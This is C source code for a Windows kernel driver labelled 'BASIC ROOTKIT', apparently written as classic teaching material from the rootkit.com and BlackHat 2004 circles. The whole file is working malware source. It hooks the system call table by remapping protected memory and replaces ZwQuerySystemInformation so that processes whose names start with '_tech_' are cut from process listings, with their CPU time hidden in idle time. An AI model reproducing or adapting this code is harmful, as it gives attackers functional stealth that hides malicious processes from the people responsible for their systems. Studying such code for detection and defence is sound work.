// BASIC ROOTKIT that hides files, directories, and processes
// ----------------------------------------------------------
// v0.1 - Initial, Greg Hoglund (hoglund@rootkit.com)
// v0.2 - DirEntry struct fixed, b00lean (b00lean@rootkit.com)
// v0.3 - Added defines to compile on W2K, and comments.  Rich
// v0.4 - Fixed bug while manipulating _SYSTEM_PROCESS array.
//		  Added code to hide process times of the _root_*'s. Creative
// v0.5 - Merged basic_7 and basic_6b into basic_8, Greg (hoglund@rootkit.com)
// v0.6 - Added way around system call table memory protection, Jamie Butler (butlerjr@acm.org)
// vBH3 - Crafted for BlackHat Windows 2004 class
// vTT1 - Tech TV Version of rootkit
// ----------------------------------------------------------
// visit www.rootkit.com for latest rootkit warez
// ----------------------------------------------------------

#include "ntddk.h"

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

// Length of process name (rounded up to next DWORD)
#define PROCNAMELEN     20
// Maximum length of NT process name
#define NT_PROCNAMELEN  16

ULONG gProcessNameOffset;

// a cheap way to steal the call number based on the mov instruction
// that lives at the function address.  For example,
//
//		mov     eax, 28h
//
// Every Zw* function starts with a mov instruction that moves the
// call number in EAX.  Thus the call number is 1 byte past the start
// of the function.  It's a hack.  It works for any Zw* function
// exported from ntoskrnl.exe
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)

// for reading/writing to the system call table
PMDL  g_MappedSystemCallTableMDL = 0;
PVOID *g_MappedSystemCallTable = 0;

struct _SYSTEM_THREADS
{
        LARGE_INTEGER           KernelTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           CreateTime;
        ULONG                           WaitTime;
        PVOID                           StartAddress;
        CLIENT_ID                       ClientIs;
        KPRIORITY                       Priority;
        KPRIORITY                       BasePriority;
        ULONG                           ContextSwitchCount;
        ULONG                           ThreadState;
        KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
        ULONG                           NextEntryDelta;
        ULONG                           ThreadCount;
        ULONG                           Reserved[6];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ProcessName;
        KPRIORITY                       BasePriority;
        ULONG                           ProcessId;
        ULONG                           InheritedFromProcessId;
        ULONG                           HandleCount;
        ULONG                           Reserved2[2];
        VM_COUNTERS                     VmCounters;
        IO_COUNTERS                     IoCounters; //windows 2000 only
        struct _SYSTEM_THREADS          Threads[1];
};

// added -Creative
struct _SYSTEM_PROCESSOR_TIMES
{
		LARGE_INTEGER					IdleTime;
		LARGE_INTEGER					KernelTime;
		LARGE_INTEGER					UserTime;
		LARGE_INTEGER					DpcTime;
		LARGE_INTEGER					InterruptTime;
		ULONG							InterruptCount;
};

// added -Creative
LARGE_INTEGER					m_UserTime;
LARGE_INTEGER					m_KernelTime;


// function prototype
NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength);

// typedef so we can make a working call thru the saved pointer
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
            ULONG SystemInformationCLass,
			PVOID SystemInformation,
			ULONG SystemInformationLength,
			PULONG ReturnLength
);

ZWQUERYSYSTEMINFORMATION 	OldZwQuerySystemInformation;

/* Find the offset of the process name within the executive process
   block.  We do this by searching for the first occurance of "System"
   in the current process when the device driver is loaded. */

void GetProcessNameOffset()
{
  PEPROCESS curproc = PsGetCurrentProcess();
  int i;
  for( i = 0; i < 3*PAGE_SIZE; i++ ) 
  {
      if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
	{
	  gProcessNameOffset = i;
	}
  }
}

/* Copy the process name into the specified buffer.  */

ULONG GetProcessName( PCHAR theName )
{
  PEPROCESS       curproc;
  char            *nameptr;
  ULONG           i;
  KIRQL           oldirql;

  if( gProcessNameOffset ) 
    {
      curproc = PsGetCurrentProcess();
      nameptr   = (PCHAR) curproc + gProcessNameOffset;
      strncpy( theName, nameptr, NT_PROCNAMELEN );
      theName[NT_PROCNAMELEN] = 0; /* NULL at end */
      return TRUE;
    } 
  return FALSE;
}

NTSTATUS NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
                        IN PVOID SystemInformation,
                        IN ULONG SystemInformationLength,
                        OUT PULONG ReturnLength
)
{
        NTSTATUS rc;

		CHAR aProcessName[PROCNAMELEN];		
		GetProcessName( aProcessName );
		DbgPrint("BHWIN: NewZwQuerySystemInformation() from %s\n", aProcessName);


        rc = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
                        SystemInformationClass,
                        SystemInformation,
                        SystemInformationLength,
                        ReturnLength );

		DbgPrint(" real ZwQuerySystemInfo returned %d", rc);

		if( NT_SUCCESS( rc ) ) 
        {
            // double check the process name, if it starts w/ '_tech_' DO NOT
            // apply any stealth
            if(0 == memcmp(aProcessName, "_tech_", 6))
            {
                    DbgPrint("rootkit: detected system query from _tech_ process\n");
            }
            else if( 5 == SystemInformationClass )
            {
                    // this is a process list, look for process names that start with
                    // '_tech_'
                    int iChanged = 0;
					struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
                    struct _SYSTEM_PROCESSES *prev = NULL;
					
                    while(curr)
                    {       
                            //struct _SYSTEM_PROCESSES *next = ((char *)curr += curr->NextEntryDelta);
                            
                            ANSI_STRING process_name;
                            RtlUnicodeStringToAnsiString( &process_name, &(curr->ProcessName), TRUE);
                            if( (0 < process_name.Length) && (255 > process_name.Length) )
                            {
                                    if(0 == memcmp( process_name.Buffer, "_tech_", 6))
                                    {
                                            //////////////////////////////////////////////
                                            // we have a winner!
                                            //////////////////////////////////////////////
                                            char _output[255];
                                            char _pname[255];
                                            memset(_pname, 0, 255);
                                            memcpy(_pname, process_name.Buffer, process_name.Length);

                                            DbgPrint(	"rootkit: hiding process, pid: %d\tname: %s\r\n", 
                                                        curr->ProcessId, 
                                                        _pname);

											iChanged = 1;

											m_UserTime.QuadPart += curr->UserTime.QuadPart;
											m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

                                            if(prev)
                                            {
                                                    if(curr->NextEntryDelta)
                                                    {
                                                            // make prev skip this entry
                                                            prev->NextEntryDelta += curr->NextEntryDelta;
                                                    }
                                                    else
                                                    {
                                                            // we are last, so make prev the end
                                                            prev->NextEntryDelta = 0;
                                                    }
                                            }
                                            else
                                            {
                                                    if(curr->NextEntryDelta)
                                                    {
                                                            // we are first in the list, so move it forward
                                                            (char *)SystemInformation += curr->NextEntryDelta;
                                                    }
                                                    else
                                                    {
                                                            // we are the only process!
                                                            SystemInformation = NULL;
                                                    }
                                            }
                                    }
                            }
							else
							{
								//add the times of _root_* processes to the idle process
								curr->UserTime.QuadPart += m_UserTime.QuadPart;
								curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
								m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
							}


                            RtlFreeAnsiString(&process_name);
                            
							if (0 == iChanged)
								prev = curr;
							else
								iChanged = 0;

                            if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
                            else curr = NULL;
                    }
            }
			else if (8 == SystemInformationClass)			//SystemProcessorTimes
			{
				struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;

				times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
			}
        }

		return rc;
}

NTSTATUS ChangeServiceTableMemoryFlags()
{
	// Map the memory into our domain and change the permissions on the memory page by using a MDL
	g_MappedSystemCallTableMDL = IoAllocateMdl(	KeServiceDescriptorTable.ServiceTableBase,		// starting virtual address
												KeServiceDescriptorTable.NumberOfServices*4,	// size of buffer
												FALSE,											// not associated with an IRP
												FALSE,											// charge quota, should be FALSE
												NULL											// IRP * should be NULL
												);
	if(!g_MappedSystemCallTableMDL)
	{
		DbgPrint("MDL could not be allocated...");
		return STATUS_UNSUCCESSFUL;
	}
	else
	{
		DbgPrint("The MDL is at 0x%x\n", g_MappedSystemCallTableMDL);
	}

	// MmBuildMdlForNonPagedPool fills in the corresponding physical page array 
	// of a given MDL for a buffer in nonpaged system space (pool).
	MmBuildMdlForNonPagedPool(g_MappedSystemCallTableMDL);
	// MDL's are supposed to be opaque, but this is the only way we know of getting to these flags...
	g_MappedSystemCallTableMDL->MdlFlags = g_MappedSystemCallTableMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	// finish off the mapping...
	g_MappedSystemCallTable = MmMapLockedPages(g_MappedSystemCallTableMDL, KernelMode);

	return STATUS_SUCCESS;
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("BHWIN: OnUnload called\n");

	// put back the old function pointer
	InterlockedExchange( (PLONG) &g_MappedSystemCallTable[ SYSCALL_INDEX(ZwQuerySystemInformation) ], 
						 (LONG) OldZwQuerySystemInformation);

	// Unlock and Free MDL
	if(g_MappedSystemCallTableMDL)
	{
		MmUnmapLockedPages(g_MappedSystemCallTable, g_MappedSystemCallTableMDL);
		IoFreeMdl(g_MappedSystemCallTableMDL);
	}
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	DbgPrint("BHWin is al1v3!");

	// make sure we can write to the memory pages that hold the service table
	if(!NT_SUCCESS(ChangeServiceTableMemoryFlags()) )
	{
		DbgPrint("Error, ChangeServiceTableMemoryFlags()");
		return STATUS_UNSUCCESSFUL;
	}

	GetProcessNameOffset();

	theDriverObject->DriverUnload  = OnUnload; 

	// place the hook using InterlockedExchange (no need to disable interrupts)
	// this uses the LOCK instruction to lock the memory bus during the next instruction 
	// Example:
	// LOCK INC DWORD PTR [EDX+04] 
	// This staves off collisions on multi-processor machines, while cli/sti only disable interrupts
	// on the current processor.
	//
	OldZwQuerySystemInformation = 
		(ZWQUERYSYSTEMINFORMATION) InterlockedExchange(		(PLONG) &g_MappedSystemCallTable[ SYSCALL_INDEX(ZwQuerySystemInformation) ], 
															(LONG) NewZwQuerySystemInformation);

	return STATUS_SUCCESS;
}

